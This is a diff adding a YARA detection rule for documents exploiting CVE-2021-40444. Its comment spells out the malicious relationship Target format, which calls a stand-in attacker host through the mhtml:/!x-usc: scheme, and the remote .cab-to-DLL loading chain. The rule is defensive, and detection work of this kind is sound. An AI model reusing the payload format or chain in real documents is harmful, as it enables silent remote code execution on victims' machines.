@@ -50,3 +50,36 @@ rule OOXML_Remote_Template : maldoc heuristic suspicious
         $marker and
         any of ($http, $https, $smb, $unc, $unc2)
 }
+
+/*
+  OOXML_MHTML_Scheme -- CVE-2021-40444 (MSHTML) relationship-Target detector.
+
+  The 2021 MSHTML zero-day shipped a .docx whose word/_rels/document.xml.rels
+  carried an oleObject relationship with TargetMode="External" and a Target of
+  the form  mhtml:http://attacker/file.html!x-usc:http://attacker/file.html .
+  Opening the document made Office fetch that URL through the MSHTML/ActiveX
+  path, which loaded a remote .cab -> .inf -> DLL with no macro and no prompt.
+
+  extract.fromOOXMLRels surfaces such a Target as a synthetic
+  "OOXML-MHTML-REL <type> <target>" stream (distinct from the generic
+  OOXML-EXTERNAL-REL because an mhtml:/!x-usc: scheme in a relationship is the
+  exploit, never benign). Matching the prefix is zero-FP by construction -- the
+  literal is yarad-synthetic and never present in raw document bytes.
+
+  score 80 = high confidence (no legitimate use of mhtml:/!x-usc: in a rel).
+  Reference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444
+*/
+rule OOXML_MHTML_Scheme : maldoc exploit cve_2021_40444
+{
+    meta:
+        author      = "yarad"
+        description = "OOXML relationship Target uses the CVE-2021-40444 mhtml:/!x-usc: MSHTML scheme"
+        reference   = "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444"
+        score       = "80"
+    strings:
+        // The synthetic marker prefix emitted by extract.fromOOXMLRels -- never
+        // present in raw document bytes, so matching it is zero-FP by construction.
+        $marker = "OOXML-MHTML-REL " ascii
+    condition:
+        filesize < 16MB and $marker
+}
